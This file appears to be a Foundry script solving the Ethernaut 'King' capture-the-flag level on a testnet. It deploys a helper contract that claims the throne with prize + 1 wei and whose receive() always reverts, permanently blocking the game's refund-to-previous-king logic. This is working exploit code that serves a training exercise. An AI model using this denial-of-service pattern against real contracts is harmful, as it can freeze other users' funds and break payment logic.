// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface King {
    function prize() external view returns (uint256);
}

// forge script script/solutions/09-King.s.sol:KingSolution --rpc-url $SEPOLIA_RPC
contract KingSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x3049C00639E6dfC269ED1451764a046f7aE500c6;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = 0x61e416C0c85352775019030e79EaFB9763a999c8;

        // YOUR SOLUTION HERE
        King king = King(challengeInstance);
        uint256 prize = king.prize();

        fallbakHelper helper = new fallbakHelper();
        helper.attack{value: prize + 1}(challengeInstance);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(9));
    }
}

contract fallbakHelper {
    function attack(address target) public payable {
        require(msg.value > 0, "Need to send some ether");
        target.call{value: msg.value}("");
    }

    receive() external payable {
        revert("Fallback not allowed");
    }
}
